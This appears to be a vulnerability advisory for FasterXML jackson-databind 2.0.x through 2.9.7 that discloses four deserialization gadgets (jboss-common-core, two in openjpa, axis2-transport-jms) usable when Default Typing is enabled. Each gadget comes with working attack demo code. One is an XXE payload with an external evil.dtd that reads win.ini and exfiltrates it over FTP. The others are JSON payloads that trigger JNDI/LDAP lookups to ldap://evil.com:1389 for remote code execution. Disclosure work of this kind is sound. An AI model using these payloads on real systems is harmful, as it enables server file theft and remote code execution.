An issue was discovered in FasterXML jackson-databind 2.0.x through 2.9.7. 
When Default Typing is enabled (either globally or for a specific property) 
 and the service has 
in the classpath,
an attacker can 
 create a payload that allows accessing files on the server side. 

------------------------
Vendor: Fasterxml.com
Affect Product:   jackson-databind - 2.0.0 - 2.9.7
Component: jackson-databind
Discoverer: Guixiong Wu

Type other: Remote code execution via LDAP/JNDI

Reference: https://github.com/FasterXML/jackson-databind/issues/2186

https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf


1. ======================= XXE / DoS

An issue was discovered in FasterXML jackson-databind 2.0.x through 2.9.7. 
When Default Typing is enabled (either globally or for a specific property) 
and the service has "jboss-common-core" jar in the classpath,
an attacker can create a payload that allows accessing files on the server side. 
--------------------------

I found a new gadget to cause a xxe attack when enableDefaultTyping is enabled.

The gadget only depends on jboss-common-core.jar. It will cause dos attack and server file leaks.

The maven dependency is as follow:

<!-- https://mvnrepository.com/artifact/org.jboss/jboss-common-core -->
<dependency>
                <groupId>org.jboss</groupId>
                <artifactId>jboss-common-core</artifactId>
                <version>2.5.0.Final</version>
</dependency>

Attack demo code：

ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();
String xml = "<!DOCTYPE root[\\n" +
                "<!ENTITY % payload SYSTEM \"file:///C:/windows/win.ini/\">\\n" +
                "<!ENTITY % remote SYSTEM \"http://127.0.0.1:8081/evil.dtd\">\\n" +
                "%remote; \\n" +
                "%send;\\n" +
                "]>";
xml = xml.replace("\"", "\\\"");
String json = "['org.jboss.util.propertyeditor.DocumentEditor', {'asText': '" + xml + "'}]";
Object object = mapper.readValue(json.replace("'", "\""), Object.class);

build a http server with port 8081,the content of evil.dtd is:

<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'ftp://127.0.0.1/%payload;'>"> %all;

build a ftp server,and run the demo code above, you can get the content of win.ini in the victim machine

Vulnerability Discoverer 

吴桂雄  Wuguixiong

2. ======================= RCE

An issue was discovered in FasterXML jackson-databind 2.0.x through 2.9.7. 
When Default Typing is enabled (either globally or for a specific property) 
and the service has "org.apache.openjpa/openjpa" jar in the classpath,
and an attacker can provide an LDAP service to access,
it is possible to make the service execute a malicious payload.
--------------------------

I found a new gadget to cause a RCE attack when enableDefaultTyping is enabled.

The gadget only depends on openjpa.jar or openjpa-kernel.jar. It will cause RCE vulnerability via ldap injection.

The maven dependency is as follow:

<!-- https://mvnrepository.com/artifact/org.apache.openjpa/openjpa -->
<dependency>
                <groupId>org.apache.openjpa</groupId>
                <artifactId>openjpa</artifactId>
                <version>2.4.0</version>
</dependency>

Attack demo code：

ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();

String json = "['org.apache.openjpa.ee.RegistryManagedRuntime', "
+"{'registryName':'ldap://127.0.0.1:1389/Test1', 'rollbackOnly': null}]";

Object object = mapper.readValue(json.replace("'", "\""), Object.class);

Vulnerability Discoverer 

吴桂雄  Wuguixiong 

3. ======================= RCE

An issue was discovered in FasterXML jackson-databind 2.0.x through 2.9.7. 
When Default Typing is enabled (either globally or for a specific property) 
and the service has "openjpa" jar in the classpath, 
and an attacker can provide an LDAP service to access,
it is possible to make the service execute a malicious payload.
 --------------------------

I found a new gadget to cause a RCEattack when enableDefaultTyping is enabled.

The gadget only depends on openjpa.jar or openjpa-kernel.jar. It will cause RCE vulnerability via ldap injection.

The maven dependency is as follow:

<!-- https://mvnrepository.com/artifact/org.apache.openjpa/openjpa -->
<dependency>
                <groupId>org.apache.openjpa</groupId>
                <artifactId>openjpa</artifactId>
                <version>2.4.0</version>
</dependency>

Attack demo code：

ObjectMapper mapper = new ObjectMapper();

mapper.enableDefaultTyping();

String json = "['org.apache.openjpa.ee.JNDIManagedRuntime',"
+"{'transactionManagerName':'ldap://evil.com:1389/Test1', 'rollbackOnly': null}]";

Object object = mapper.readValue(json.replace("'", "\""), Object.class);
 
Vulnerability Discoverer 

吴桂雄  Wuguixiong 

4. ======================= RCE

An issue was discovered in FasterXML jackson-databind 2.0.x through 2.9.7. 
When Default Typing is enabled (either globally or for a specific property) 
and the service has "axis2-transport-jms" jar in the classpath,
and an attacker can provide an LDAP service to access,
it is possible to make the service execute a malicious payload.
--------------------------

I found a new gadget to cause a RCE attack when enableDefaultTyping is enabled.

The gadget only depends on axis2-transport-jms.jar. It will cause RCE vulnerability via ldap injection through jms protocol.

The maven dependency is as follow:

<!-- https://mvnrepository.com/artifact/org.apache.axis2/axis2-transport-jms -->
<dependency>
                <groupId>org.apache.axis2</groupId>
                <artifactId>axis2-transport-jms</artifactId>
                <version>1.7.8</version>
</dependency>

Attack demo code：

ObjectMapper mapper = new ObjectMapper();

mapper.enableDefaultTyping();

String json = "['org.apache.axis2.transport.jms.JMSOutTransportInfo', 'jms:/ldap://evil.com:1389/Test1']";

Object object = mapper.readValue(json.replace("'", "\""), Object.class);

Vulnerability Discoverer 

吴桂雄  Wuguixiong


